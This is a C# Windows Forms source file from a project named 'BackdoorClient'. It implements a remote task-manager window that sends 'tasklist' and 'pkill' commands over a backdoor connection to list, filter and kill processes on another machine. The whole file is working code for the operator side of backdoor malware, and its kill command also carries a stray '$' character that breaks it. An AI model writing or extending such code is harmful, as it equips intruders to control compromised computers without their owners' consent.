using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace BackdoorClient
{
    public partial class TaskMgr : Form
    {
        public Form1 mainForm;
        public TaskMgr(Form1 f)
        {
            mainForm = f;
            InitializeComponent();
        }

        private void TaskMgr_Load(object sender, EventArgs e)
        {
            if (!mainForm.TestConnect())
            {
              
                this.Close();
                return;
            }
            RefreshTaskMgr();
        }

        private void RefreshTaskMgr()
        {
            XmlDocument doc = new XmlDocument();
            string docContent = mainForm.SendCommandAndGetResponce("tasklist");
            tasksView.Nodes.Clear();
            doc.LoadXml(docContent);

            XmlNode root = doc.FirstChild;

            if (root.HasChildNodes)
            {
                for (int i = 0; i < root.ChildNodes.Count; i++)
                {
                    tasksView.Nodes.Add(root.ChildNodes[i].InnerText);
                }
            }
            processValue.Text = $"К-лво процессов: {tasksView.Nodes.Count}";
        }

        private void RefreshTasks_Click(object sender, EventArgs e)
        {
            RefreshTaskMgr();
        }

        private void taskill_Click(object sender, EventArgs e)
        {
            mainForm.SendCommandAndGetResponce($"pkill ${tasksView.SelectedNode.Text}");
            if (findTaskTextBox.Text == "") RefreshTaskMgr(); else findTaskButton_Click(null, null);
        }

        private void findTaskButton_Click(object sender, EventArgs e)
        {
            if (findTaskTextBox.Text == "")
            {
                RefreshTaskMgr();
                return;
            }
            RefreshTaskMgr();
            for (int j = 0; j < 10; j++)
            {
                for (int i = 0; i < tasksView.Nodes.Count; i++)
                {
                    if (!tasksView.Nodes[i].Text.StartsWith(findTaskTextBox.Text))
                    {
                        tasksView.Nodes.Remove(tasksView.Nodes[i]);
                    }
                }
            }
            //findTaskTextBox.Text = "";
        }

        private void findTaskTextBox_TextChanged(object sender, EventArgs e)
        {

        }

        private void tasksView_AfterSelect(object sender, TreeViewEventArgs e)
        {

        }
    }
}
